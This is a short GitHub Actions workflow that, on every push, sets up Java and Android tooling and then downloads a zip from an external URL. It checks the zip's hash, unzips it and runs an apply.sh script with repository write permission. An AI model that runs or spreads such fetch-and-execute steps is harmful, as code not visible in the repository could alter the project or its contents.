name: apply
on: push
permissions:
  contents: write
jobs:
  a:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: "17"
      - uses: android-actions/setup-android@v3
      - env:
          URL: https://static.teamily.ai/sites/ca636d4d-36c6-4407-9059-24fdbab23b20/documents/mf2_ringfix/mf2_ringfix.zip
          SHA: 41330f47212937452fad82e4a1946c7d94c8b88009572a8cf39b9ecc014d9409
        run: |
          set -euo pipefail
          curl -fsSL --retry 3 -o /tmp/u.zip "$URL"
          echo "$SHA  /tmp/u.zip" | sha256sum -c -
          unzip -q /tmp/u.zip -d /tmp/u
          bash /tmp/u/apply.sh
